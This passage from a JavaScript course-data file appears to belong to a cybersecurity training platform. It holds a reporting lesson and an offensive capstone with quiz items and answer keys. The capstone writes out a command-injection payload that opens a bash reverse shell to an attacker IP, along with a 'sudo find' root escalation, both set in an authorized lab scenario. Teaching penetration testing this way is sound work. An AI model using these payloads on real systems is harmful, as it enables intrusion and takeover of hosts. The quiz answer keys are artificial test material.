          "commonMistakes": "Writing overly technical executive summaries that fail to communicate business risk to leadership.",
          "learningOutcome": "You can write executive summaries, document technical findings with reproducible PoCs, and formulate prioritized remediation roadmaps."
        },
        "questions": [
          {
            "id": "q-46-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Reporting and Remediation?",
            "options": [
              "Structure a professional penetration testing report",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Structure a professional penetration testing report is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-46-1",
        "type": "multiple-choice",
        "question": "What is the primary target audience and objective of the Executive Summary section in a penetration testing report?",
        "options": [
          "Software developers who want raw terminal debug logs",
          "Executive leadership (CISO, CEO, Board) to understand overall security posture and business risks in non-technical terms",
          "The general public on social media",
          "Third-party advertising agencies"
        ],
        "correctIndex": 1,
        "hint": "Written for senior leadership in business language.",
        "explanation": "The Executive Summary translates technical findings into business risk for C-level executives and decision-makers."
      },
      {
        "id": "q-46-2",
        "type": "exact",
        "question": "What follow-up assessment is conducted 30 to 60 days after report delivery to verify that developer patches successfully resolved the findings?",
        "visualSlots": "_ _ _ _ _ _",
        "acceptedAnswers": [
          "retest",
          "retesting",
          "re-test",
          "re-testing"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Testing again to verify fixes.",
        "explanation": "A retest confirms that vulnerabilities have been properly remediated by the development team."
      },
      {
        "id": "q-46-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Reporting and Remediation?",
        "options": [
          "Structure a professional penetration testing report",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Structure a professional penetration testing report is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The Anatomy of a Professional Penetration Testing Report",
        "instruction": "Review the structural components of an enterprise penetration testing report.",
        "hints": [
          "Written for senior leadership in business language."
        ]
      },
      {
        "title": "Task 2: Actionable Remediation Guidance & Retesting",
        "instruction": "Analyze the difference between vague advice and actionable engineering remediation.",
        "hints": [
          "Testing again to verify fixes."
        ]
      },
      {
        "title": "Task 3: Reporting & Communication Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-47"
  },
  {
    "id": "room-47",
    "stageId": "offensive-security",
    "stageTitle": "Offensive Security",
    "stageOrder": 4,
    "stage": 4,
    "level": 4,
    "levelTitle": "Offensive Security",
    "roomNumber": 47,
    "title": "Offensive Security Capstone",
    "description": "Synthesize your complete offensive training: conduct a full-scope simulated authorized penetration test, chain vulnerabilities, and produce an executive remediation report.",
    "difficulty": "Advanced",
    "difficultyBadge": "Advanced",
    "estimatedTime": "60 mins",
    "xpReward": 50,
    "prerequisites": "room-46",
    "whyAreYouHere": "Synthesize your complete offensive training: conduct a full-scope simulated authorized penetration test, chain vulnerabilities, and produce an executive remediation report.",
    "objectives": [
      "Execute a full penetration testing engagement from reconnaissance to exploitation",
      "Perform network and service enumeration across target infrastructure",
      "Discover and exploit web application vulnerabilities to gain initial shell access",
      "Escalate privileges to root and compile an executive remediation report"
    ],
    "skillsGained": [
      "Full Pentest Synthesis",
      "Vulnerability Chaining",
      "Root Privilege Escalation",
      "Final Executive Report"
    ],
    "toolsAndCommands": [
      "nmap -sC -sV",
      "curl",
      "nc -lvnp",
      "sudo -l",
      "pandoc"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Capstone Engagement: Reconnaissance & Initial Access",
        "concept": "**Mission Briefing:** You are contracted by Nexus Cloud Services to conduct a comprehensive Gray-Box penetration test against their newly acquired financial analytics platform (`analytics.nexus-cloud.internal` / `10.10.11.100`). Your authorized scope covers `10.10.11.100`.\n**Phase 1: Enumeration:**\n1. Nmap scan reveals two open ports: Port 22 (SSH OpenSSH 8.9p1) and Port 80 (HTTP Apache 2.4.52)\n2. Web enumeration discovers a customer portal with an input field: `analytics.nexus-cloud.internal/report.php?system=local`\n3. Testing input for command injection reveals: `system=local;id` returns `uid=33(www-data) gid=33(www-data)`!\n**Phase 2: Initial Foothold:**\n- Set up Netcat listener on testing box: `nc -lvnp 9001`\n- Trigger reverse shell payload: `report.php?system=local;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/9001+0>%261'`\n- Connection received! You have obtained a low-privilege shell as `www-data`.",
        "whyItMatters": "Chaining parameter analysis to command injection delivers initial shell access.",
        "examples": [
          "Phase 1: Nmap discovers open port 80 -> Phase 2: Command injection on report.php -> Phase 3: Reverse shell caught on port 9001"
        ],
        "commands": [
          {
            "cmd": "echo 'Nexus Cloud Capstone: Low-Privilege Shell Obtained (www-data)'",
            "desc": "Review initial access milestone"
          }
        ],
        "guidedExercise": "Trace the attack chain from web parameter discovery to reverse shell foothold.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-47-1",
            "type": "multiple-choice",
            "question": "In the capstone scenario, what web vulnerability allowed the penetration tester to obtain the initial reverse shell foothold?",
            "options": [
              "Cross-Site Scripting (XSS)",
              "OS Command Injection in report.php",
              "SQL Injection in search.php",
              "Missing SSL certificate"
            ],
            "correctIndex": 1,
            "hint": "Executing system commands through an unsanitized parameter.",
            "explanation": "The vulnerability was OS Command Injection, permitting arbitrary shell commands via the system parameter."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Phase 3: Internal Enumeration & Root Privilege Escalation",
        "concept": "**Post-Exploitation Investigation:**\n1. Running `sudo -l` reveals: `(root) NOPASSWD: /usr/bin/find`\n2. Cross-referencing GTFOBins confirms that `find` can execute commands under sudo:\n`sudo find . -exec /bin/sh \\; -quit`\n3. Running the command elevates your session to `root` (UID 0)!\n`whoami` -> `root`\n4. You have achieved complete system compromise in a controlled, authorized manner.\n**Deliverables:**\n- Clean up all temporary reverse shell files\n- Document exact reproduction steps with timestamps\n- Provide immediate remediation: Replace `system()` calls in `report.php` with safe internal PHP APIs, and remove `find` from the sudoers configuration.",
        "whyItMatters": "Achieving root cleanly and providing instant remediation demonstrates complete professional mastery.",
        "examples": [
          "PrivEsc: Sudo find shell breakout -> Root Flag Captured -> System Cleaned -> Report Generated"
        ],
        "commands": [
          {
            "cmd": "echo 'Nexus Cloud Capstone: Complete Root Compromise Achieved & Cleaned'",
            "desc": "Review privilege escalation milestone"
          }
        ],
        "guidedExercise": "Analyze the privilege escalation vector and document the remediation steps.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-47-2",
            "type": "exact",
            "question": "What user identity was obtained by exploiting the sudo find configuration on the capstone target host?",
            "visualSlots": "_ _ _ _",
            "acceptedAnswers": [
              "root"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "The ultimate administrative superuser in Linux.",
            "explanation": "Exploiting the misconfigured sudo find permission granted full root superuser access."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Academy Graduation & Master Synthesis",
        "concept": "CONGRATULATIONS! You have completed the entire CALION Cybersecurity Academy curriculum!\nAcross 4 Stages and 47 Rooms, you progressed from computer architecture and packet switching, through security principles, cryptography, and defense, into SOC analysis, threat hunting, and full-scope ethical penetration testing.\nYou possess the mindset, technical tools, and architectural understanding of a true cybersecurity practitioner.",
        "whyItMatters": "Keep learning, stay curious, and always use your powers ethically to defend the digital world.",
        "examples": [
          "Stage 1: Pre-Security (Completed)",
          "Stage 2: Cyber Security Foundations (Completed)",
          "Stage 3: Defensive Security (Completed)",
          "Stage 4: Offensive Security (Completed)"
        ],
        "commands": [
          {
            "cmd": "echo 'CALION Cybersecurity Academy: 47/47 Rooms Mastered!'",
            "desc": "Celebrate Graduation"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Full penetration testing lifecycle synthesis: port scanning, web command injection, reverse shell handling, GTFOBins privilege escalation, and executive remediation reporting.",
          "technicalTakeaways": "Chaining web command injection with sudo misconfigurations yields complete host compromise. Clear reporting delivers lasting client defense.",
          "commandsCovered": [
            "Nmap",
            "Netcat",
            "Reverse shells",
            "GTFOBins find",
            "Reporting"
          ],
          "commonMistakes": "Leaving reverse shells active or failing to clean up artifacts after testing.",
          "learningOutcome": "You have completed the entire 47-room CALION Academy curriculum and can plan, execute, and report full-scope cybersecurity assessments!"
        },
        "questions": [
          {
            "id": "q-47-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Offensive Security Capstone?",
            "options": [
              "Execute a full penetration testing engagement from reconnaissance to exploitation",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Execute a full penetration testing engagement from reconnaissance to exploitation is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-47-1",
        "type": "multiple-choice",
        "question": "In the capstone scenario, what web vulnerability allowed the penetration tester to obtain the initial reverse shell foothold?",
        "options": [
          "Cross-Site Scripting (XSS)",
          "OS Command Injection in report.php",
          "SQL Injection in search.php",
          "Missing SSL certificate"
        ],
        "correctIndex": 1,
        "hint": "Executing system commands through an unsanitized parameter.",
        "explanation": "The vulnerability was OS Command Injection, permitting arbitrary shell commands via the system parameter."
      },
      {
        "id": "q-47-2",
        "type": "exact",
        "question": "What user identity was obtained by exploiting the sudo find configuration on the capstone target host?",
        "visualSlots": "_ _ _ _",
        "acceptedAnswers": [
          "root"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "The ultimate administrative superuser in Linux.",
        "explanation": "Exploiting the misconfigured sudo find permission granted full root superuser access."
      },
      {
        "id": "q-47-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Offensive Security Capstone?",
        "options": [
          "Execute a full penetration testing engagement from reconnaissance to exploitation",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Execute a full penetration testing engagement from reconnaissance to exploitation is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Capstone Engagement: Reconnaissance & Initial Access",
        "instruction": "Trace the attack chain from web parameter discovery to reverse shell foothold.",
        "hints": [
          "Executing system commands through an unsanitized parameter."
        ]
      },
      {
        "title": "Task 2: Phase 3: Internal Enumeration & Root Privilege Escalation",
        "instruction": "Analyze the privilege escalation vector and document the remediation steps.",
        "hints": [
          "The ultimate administrative superuser in Linux."
        ]
      },
      {
        "title": "Task 3: Academy Graduation & Master Synthesis",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": null
  }
];

// Backward compatibility references for legacy test runners and existing state engines
const PRE_SECURITY_ROOMS = CALION_ROOMS;
const PRE_SECURITY_LEVELS = [
  {
    "id": 0,
    "number": "01",
    "title": "Pre-Security",
    "tagline": "Foundational Computing, Networking & Command-Line",
    "description": "Essential computing architecture, network protocols, Linux/Windows operating systems, and command-line mechanics required before offensive and defensive security.",
    "color": "#0284c7",
    "icon": "shield",
    "roomCount": 10,
    "estimatedTime": "5 hr 30 min",
    "difficulty": "Beginner"
  },
  {
    "id": 1,
    "number": "02",
    "title": "Cyber Security Foundations",
    "tagline": "Core Security Principles, Threat Modeling & Defense",
    "description": "Master the core principles of cybersecurity: the CIA Triad, threat modeling, authentication architectures, applied cryptography, malware classification, and incident response frameworks.",
    "color": "#6366f1",
    "icon": "lock",
    "roomCount": 10,
    "estimatedTime": "6 hr 15 min",
    "difficulty": "Foundational"
  },
  {
    "id": 2,
    "number": "03",
    "title": "Defensive Security",
    "tagline": "Blue Team Operations, SOC Analysis & Threat Hunting",
    "description": "Specialized defensive security training: SOC operations, Windows/Linux log analysis, Wireshark traffic inspection, SIEM detection engineering, digital forensics, and incident containment.",
    "color": "#10b981",
    "icon": "security",
    "roomCount": 12,
    "estimatedTime": "8 hr 45 min",
    "difficulty": "Intermediate"
  },
  {
    "id": 3,
    "number": "04",
    "title": "Offensive Security",
    "tagline": "Authorized Security Testing, Exploitation & Remediation",
    "description": "Specialized offensive security training: Rules of engagement, network reconnaissance, service enumeration, OWASP Top 10 web exploitation, privilege escalation, and executive remediation reporting.",
    "color": "#ef4444",
    "icon": "swords",
    "roomCount": 15,
    "estimatedTime": "11 hr 20 min",
    "difficulty": "Advanced"
  }
];

const CALION_ROOM_MAP = {};
CALION_ROOMS.forEach(r => { CALION_ROOM_MAP[r.id] = r; });
const PRE_SECURITY_ROOM_MAP = CALION_ROOM_MAP;

if (typeof window !== 'undefined') {
  window.CALION_STAGES = CALION_STAGES;
  window.CALION_ROOMS = CALION_ROOMS;
  window.CALION_ROOM_MAP = CALION_ROOM_MAP;
  window.PRE_SECURITY_ROOMS = CALION_ROOMS;
  window.PRE_SECURITY_ROOM_MAP = PRE_SECURITY_ROOM_MAP;
  window.PRE_SECURITY_LEVELS = PRE_SECURITY_LEVELS;
  window.ENDLESSUS_ROOMS = CALION_ROOMS;
  window.ENDLESSUS_ROOM_MAP = CALION_ROOM_MAP;
  window.ENDLESSUS_STAGES = PRE_SECURITY_LEVELS;
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    CALION_STAGES,
    CALION_ROOMS,
    CALION_ROOM_MAP,
    PRE_SECURITY_ROOMS,
    PRE_SECURITY_ROOM_MAP,
    PRE_SECURITY_LEVELS,
    ENDLESSUS_STAGES: PRE_SECURITY_LEVELS,
    ENDLESSUS_ROOMS: CALION_ROOMS,
    ENDLESSUS_ROOM_MAP: CALION_ROOM_MAP
  };
}
